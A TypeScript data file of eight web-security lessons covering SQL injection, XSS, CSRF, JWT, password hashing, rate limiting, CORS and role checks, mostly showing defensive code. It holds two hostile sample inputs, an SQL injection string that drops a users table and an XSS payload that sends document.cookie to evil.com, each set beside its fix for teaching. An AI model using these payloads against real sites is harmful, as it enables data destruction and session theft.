import type { Lesson } from '../../types/curriculum';

export const securityLessons: Lesson[] = [
  {
    id: 'sec_0',
    title: 'The OWASP Top 10 Mental Model',
    badge: 'Foundations',
    badgeClass: 'badge-concept',
    content: [
      'Web security is not a "plugin" you add at the end; it is a primary architectural concern. The **OWASP Top 10** represents the most critical security risks to web applications according to global security experts.',
      'The most common (and dangerous) vulnerability is **Injection** (like SQLi). This happens when untrusted data is sent to an interpreter as part of a command or query. The interpreter is tricked into executing unintended commands or accessing data without authorization.',
      'Security is a "Layered" approach (Defense in Depth). You don\'t rely on one single fix; you implement validation at the UI layer, sanitization at the API layer, and strict permissions at the Database layer. If one layer fails, the others protect you.'
    ],
    code: `// ── SQL Injection: The Classic Mistake ──
const id = req.params.id;

// ❌ Vulnerable: malicious user can send "1; DROP TABLE users;"
const sql = "SELECT * FROM users WHERE id = " + id;
db.execute(sql);

// ✅ Secure: Parameterized Query (Prepaired Statement)
// The "id" is treated as data, never as code.
const safeSql = "SELECT * FROM users WHERE id = $1";
db.execute(safeSql, [id]);`
  },
  {
    id: 'sec_1',
    title: 'XSS: Cross-Site Scripting',
    badge: 'Core',
    badgeClass: 'badge-concept',
    content: [
      '**XSS** occurs when an attacker can inject malicious client-side scripts (usually JavaScript) into a web page viewed by other users. This allows them to steal session cookies, redirect users, or deface the site.',
      'The golden rule: **Never trust user input.** Always "Encode" data before displaying it. Modern frameworks like React handle this automatically for most text, but vulnerabilities often hide in things like `dangerouslySetInnerHTML` or URL parameters.',
      'Content Security Policy (CSP) is your final shield. It is a browser-level instruction that defines which scripts and domains are allowed to run on your site. A strict CSP makes XSS almost impossible to exploit even if a vulnerability exists.'
    ],
    code: `// ── React: Automatic Escaping ──
const userInput = "<script>fetch('https://evil.com?c=' + document.cookie)</script>";

// ✅ This is SAFE: React renders the script as literal text
return <div>{userInput}</div>;

// ❌ This is DANGEROUS: Executes the script!
return <div dangerouslySetInnerHTML={{ __html: userInput }} />;

// ── Content Security Policy Header ──
// Content-Security-Policy: default-src 'self'; script-src 'self' https://trusted.com;`
  },
  {
    id: 'sec_2',
    title: 'CSRF & Secure Session Management',
    badge: 'Core',
    badgeClass: 'badge-concept',
    content: [
      '**CSRF (Cross-Site Request Forgery)** tricks a logged-in user into performing actions they didn\'t intend to (like changing their password or transferring money). The browser automatically sends cookies with every request, allowing an evil site to "piggyback" on your session.',
      'Modern defense relies on **SameSite Cookie Attributes**. By setting `SameSite=Strict`, the browser will refuse to send your cookie if the request comes from a different domain. This single change prevents 99% of CSRF attacks.',
      'Always use **HttpOnly** cookies for session tokens. This makes them invisible to JavaScript, meaning that even if an attacker finds an XSS vulnerability, they cannot steal your session token to hijack your account.'
    ],
    code: `// ── Secure Cookie Implementation (Express) ──
res.cookie('session_id', token, {
  httpOnly: true,  // 👈 JS cannot read this (prevents XSS theft)
  secure:   true,  // 👈 Only sent over HTTPS
  sameSite: 'strict', // 👈 Prevents CSRF
  maxAge:   3600000 // 1 hour
});

// ── CSRF Token Header (Alternative) ──
// 1. Server sends a unique token to the UI
// 2. UI sends the token back in a header (e.g., X-CSRF-TOKEN)
// 3. Evil sites can't read the header due to CORS!`
  },
  {
    id: 'sec_3',
    title: 'JWT Security: The Right Way',
    badge: 'Deep Dive',
    badgeClass: 'badge-practice',
    content: [
      '**JSON Web Tokens (JWT)** are the standard for stateless authentication. However, they are easily misused. A common mistake is storing JWTs in `localStorage`, which is accessible to JavaScript and therefore vulnerable to XSS.',
      'A JWT is NOT encrypted; it is only "Signed". Anyone can decode the payload and see your data using tools like jwt.io. Never store sensitive information like passwords or credit card numbers inside a JWT payload.',
      'The most secure pattern: use a short-lived **Access Token** in memory and a long-lived **Refresh Token** in an HttpOnly, SameSite-Strict cookie. This provides the best balance of security and user experience.'
    ],
    code: `// ── JWT Payload (Visible to everyone!) ──
{
  "sub": "1234567890",
  "name": "Puru",
  "role": "admin",  // ⚠️ Role manipulation risk!
  "iat": 1516239022
}

// ── JWT Signing (Server-side) ──
const token = jwt.sign(payload, process.env.JWT_SECRET, { 
  algorithm: 'HS256', 
  expiresIn: '15m' // 👈 Keep it short!
});`
  },
  {
    id: 'sec_4',
    title: 'Password Hashing & Salting',
    badge: 'Foundations',
    badgeClass: 'badge-concept',
    content: [
      '**Never, ever store passwords in plain text.** If your database is leaked, every single user\'s account (and likely their accounts on other sites) is compromised. You must use a "Slow" hashing algorithm like **Argon2** or **bcrypt**.',
      'A **Salt** is a random string added to the password before hashing. It ensures that two users with the same password ("password123") have completely different hashes in your database. This prevents "Rainbow Table" attacks.',
      'Hashing is a one-way street. You cannot "de-hash" a password to find the original. When a user logs in, you hash their provided password and compare it to the stored hash. If they match, the login is valid.'
    ],
    code: `// ── Secure Password Hashing with Bcrypt ──
const bcrypt = require('bcrypt');

// 1. During Registration
const saltRounds = 12;
const hashedPassword = await bcrypt.hash(rawPassword, saltRounds);
// Save hashedPassword to DB...

// 2. During Login
const match = await bcrypt.compare(providedPassword, storedHash);
if (match) {
  // Login successful
} else {
  // Invalid credentials
}`
  },
  {
    id: 'sec_5',
    title: 'Rate Limiting & Brute Force',
    badge: 'DevOps',
    badgeClass: 'badge-practice',
    content: [
      '**Brute Force** is the process of trying millions of password combinations until one works. Without **Rate Limiting**, an attacker can test thousands of passwords per second against your login endpoint.',
      'Global rate limiting is good, but "Per-User" and "Per-IP" limiting is better. If someone fails their password 5 times, lock the account or require a CAPTCHA. This turns an automated attack into a slow, manual frustration for the hacker.',
      'Use professional middleware like `express-rate-limit` and store the counts in Redis. This ensures your rate limiting works across multiple server instances and doesn\'t disappear when you restart your API.'
    ],
    code: `// ── Rate Limiting Middleware ──
const rateLimit = require('express-rate-limit');

const loginLimiter = rateLimit({
  windowMs: 15 * 60 * 1000, // 15 minutes
  max: 5,                   // Block IP after 5 failed attempts
  message: "Too many login attempts, please try again after 15 minutes",
  standardHeaders: true, 
  legacyHeaders: false,
});

app.post('/api/login', loginLimiter, (req, res) => {
  // Login logic...
});`
  },
  {
    id: 'sec_6',
    title: 'API Security: CORS & Headers',
    badge: 'Code',
    badgeClass: 'badge-code',
    content: [
      '**CORS (Cross-Origin Resource Sharing)** is a browser safety feature, not a server security feature. It prevents a malicious site from making requests to your API on behalf of the user unless you explicitly "Allow" that domain.',
      'Never use `Access-Control-Allow-Origin: *` in production. This allows *any* site to interact with your API. Instead, maintain a "Whitelist" of your trusted domains (e.g., your frontend and staging sites).',
      'Use the `helmet` middleware to set secure HTTP headers like `X-Frame-Options` (prevents Clickjacking) and `X-Content-Type-Options` (prevents MIME-sniffing). These are easy "quick wins" for any project\'s security posture.'
    ],
    code: `// ── Secure API Headers with Helmet ──
const helmet = require('helmet');
app.use(helmet());

// ── Strict CORS Policy ──
const cors = require('cors');
const whitelist = ['https://my-app.com', 'https://admin.my-app.com'];

app.use(cors({
  origin: function (origin, callback) {
    if (whitelist.indexOf(origin) !== -1 || !origin) {
      callback(null, true);
    } else {
      callback(new Error('Blocked by CORS'));
    }
  },
  credentials: true // Allow cookies/JWT headers
}));`
  },
  {
    id: 'sec_7',
    title: 'Project Execution: The Auth Guard',
    badge: 'Project',
    badgeClass: 'badge-practice',
    content: [
      'In this final task, you will implement a secure Authentication system for JobTrackr. You will write a "VerifyJWT" middleware that checks for a valid token in the headers and populates the `req.user` object.',
      'You must also implement a "Role-Based Access Control" (RBAC) system to ensure that only "Admins" can delete job postings, while "Users" can only view them.',
      '**Studio Task**: Build the `requireAdmin` middleware. It must check the user\'s role from the JWT, and if they are not an admin, return a 403 Forbidden error with a "Security Audit Log" entry.'
    ],
    code: `// ── RBAC Middleware Prototype ──
const authorize = (allowedRoles) => {
  return (req, res, next) => {
    // 1. JWT Middleware already populated req.user
    if (!req.user) return res.sendStatus(401);

    // 2. Check if user's role is in the allowed list
    if (allowedRoles.includes(req.user.role)) {
      next();
    } else {
      console.warn(\`SECURITY: Unauthorized access attempt by \${req.user.id}\`);
      res.status(403).json({ error: "Access Denied" });
    }
  };
};

// Usage:
app.delete('/api/jobs/:id', authorize(['admin']), (req, res) => {
  // Only admins reach this code!
});`
  }
];
